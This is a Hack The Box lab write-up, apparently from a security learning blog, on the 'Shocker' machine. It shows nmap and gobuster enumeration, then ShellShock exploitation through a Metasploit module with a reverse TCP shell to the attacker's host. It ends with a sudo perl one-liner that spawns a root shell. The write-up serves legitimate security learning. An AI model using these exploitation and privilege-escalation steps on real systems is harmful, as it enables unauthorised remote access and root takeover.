@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Shocker Write-Up | The Cyber Experiment</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Shocker Write-Up" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Shocker The Shocker box was part of the easy month on HTB. We gain initial foothold as the shelly user by exploiting the ShellShock vulnerability. We escalate to the root user by exploiting a sudoers misconfiguration that allows us to run perl as root wihtout a password." />
+<meta property="og:description" content="Shocker The Shocker box was part of the easy month on HTB. We gain initial foothold as the shelly user by exploiting the ShellShock vulnerability. We escalate to the root user by exploiting a sudoers misconfiguration that allows us to run perl as root wihtout a password." />
+<link rel="canonical" href="/htb/shocker" />
+<meta property="og:url" content="/htb/shocker" />
+<meta property="og:site_name" content="The Cyber Experiment" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-21T15:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Shocker Write-Up" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Shocker Write-Up","dateModified":"2021-08-21T15:00:00+02:00","url":"/htb/shocker","datePublished":"2021-08-21T15:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/htb/shocker"},"description":"Shocker The Shocker box was part of the easy month on HTB. We gain initial foothold as the shelly user by exploiting the ShellShock vulnerability. We escalate to the root user by exploiting a sudoers misconfiguration that allows us to run perl as root wihtout a password.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="The Cyber Experiment" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">The Cyber Experiment</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Shocker Write-Up</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-08-21T15:00:00+02:00" itemprop="datePublished">Aug 21, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="shocker">Shocker</h1>
+<p>The Shocker box was part of the easy month on HTB. We gain initial foothold as the <code class="language-plaintext highlighter-rouge">shelly</code> user by exploiting the ShellShock vulnerability. We escalate to the root user by exploiting a sudoers misconfiguration that allows us to run perl as root wihtout a password.</p>
+
+<h2 id="scanning-and-enumeration">Scanning and Enumeration</h2>
+<p>I start the enumeration with a basic nmap scan and discover that port 80 (HTTP) is open.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Thu Jul  8 12:50:02 2021 as: nmap -sC -sV -n -oA htb/shocker/nmap/initial 10.10.10.56</span>
+Nmap scan report <span class="k">for </span>10.10.10.56
+Host is up <span class="o">(</span>0.025s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span class="o">(</span>ED25519<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu Jul  8 12:50:11 2021 -- 1 IP address (1 host up) scanned in 9.07 seconds</span>
+</code></pre></div></div>
+
+<h2 id="enumerating-port-80-http">Enumerating Port 80 (HTTP)</h2>
+<p>The webapplication exposes no interesting functionality. Further enumerating the web app through forced browsing using GoBuster; I discover the <code class="language-plaintext highlighter-rouge">/cgi-bin/</code> directory. Given that the machine is called shocker it might be worthwhile to check for the well known ShellShock vulnerability. ShellShock is a parser vulnerability in Bash that allows for arbitrary command execution.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://10.10.10.56/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt 
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.10.56/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2021/07/09 05:27:43 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 290]
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 295]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 295]
+/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 294]  &lt;<span class="nt">-----</span> Lets find any CGI Scripts here
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 137]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 299]
+                                               
+<span class="o">===============================================================</span>
+2021/07/09 05:27:55 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>To test for ShellShock we must force the server to call bash. Using gobuster I look for Bash shell scripts that can be invoked.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://10.10.10.56/cgi-bin/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  <span class="nt">-x</span> cgi,sh 
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.10.56/cgi-bin/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              cgi,sh
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2021/07/09 07:06:58 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.html.cgi            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]
+/.html.sh             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302]
+/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 299]
+/.htm                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 298]
+/.htm.cgi             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302]
+/user.sh              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 118]     &lt;<span class="nt">-----</span> Looks like a bash script
+/.htm.sh              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 301]
+...[snip]...                                               
+<span class="o">===============================================================</span>
+2021/07/08 13:36:26 Finished
+<span class="o">===============================================================</span>
+
+Having identified the <span class="sb">`</span>user.sh<span class="sb">`</span> bash script we can now <span class="nb">test </span><span class="k">for </span>the ShellShock vulnerability. I will use Metasploit that has a module <span class="k">for </span>exploiting ShellShock. After invoking the module I get a shell as the <span class="sb">`</span>shelly<span class="sb">`</span> user.
+
+<span class="sb">```</span>bash
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+<span class="nb">set </span>LHOST 10.10.14.167
+<span class="nb">set </span>LPORT 4444
+<span class="nb">set </span>payload linux/x64/shell_reverse_tcp
+
+run
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Checking first for SUID/GUID binaries I find nothing interesting. Running <code class="language-plaintext highlighter-rouge">sudo -l</code> I discover that <code class="language-plaintext highlighter-rouge">shelly</code> may run perl as root without a password. In other words, we may run arbitrary perl code as the root user. To obtains a proper interactive root shell I invoke a shell from perl.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash"'</span>
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/htb/shocker" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">The Cyber Experiment</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">The Cyber Experiment</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/the-cyber-experiment"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">the-cyber-experiment</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
